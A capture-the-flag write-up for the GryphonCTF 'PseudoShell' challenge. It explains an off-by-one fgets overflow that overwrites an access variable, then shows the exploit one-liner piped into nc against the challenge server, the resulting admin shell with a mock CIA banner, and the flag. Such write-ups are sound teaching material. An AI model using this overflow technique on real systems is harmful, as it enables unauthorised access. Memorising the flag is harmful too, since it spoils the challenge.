# PseudoShell
Pwn - 60 points

## Challenge 
> I managed to hook on to a shady agency's server, can you help me secure it?
>
> `nc pwn2.chal.gryphonctf.com 17341`
>
> Creator - @LFlare

[pseudoshell-50895beae13919d558e135f80e1b745d.c](pseudoshell-50895beae13919d558e135f80e1b745d.c)

[pseudoshell-redacted-b10b09ab4283ed5d2bbf0e0d372f371e](pseudoshell-redacted-b10b09ab4283ed5d2bbf0e0d372f371e)

## Solution

The vulnerability is in `login()`

    int access = 0xff;
    char password[16];
    ...
    // Add one more to fgets for null byte
    fgets(password, 17, stdin);

In essence, `fgets()` already accounts for the null byte, so there's no need to add one more (aka. off by one error).
Hence, overflowing the input will immediately override `int access`.

	$ (python -c "print '\n' + 'A' * 17" && cat) | nc pwn2.chal.gryphonctf.com 17341
	The authenticity of host 'backend.cia.gov (96.17.215.26)' can't be established.
	ECDSA key fingerprint is SHA256:1loFo62WjwvamuIcfhqo4O2PNdltJgSJ7fB3GpKLm4o.
	Are you sure you want to continue connecting (yes/no)? Warning: Permanently added 'backend.cia.gov,96.17.215.26' (ECDSA) to the list of known hosts.
	root@backend.cia.gov's password: SUCCESSFULLY LOGGED IN AS ADMIN!

Now we have a shell

	$ find | grep 'flag.txt'
	./home/pseudoshell/flag.txt
	
	$ cat ./home/pseudoshell/flag.txt
	GCTF{0ff_by_0n3_r34lly_5uck5}

*(I also wrote a test script using pwntools. [`solve.py`](solve.py))*

## Flag
`GCTF{0ff_by_0n3_r34lly_5uck5}`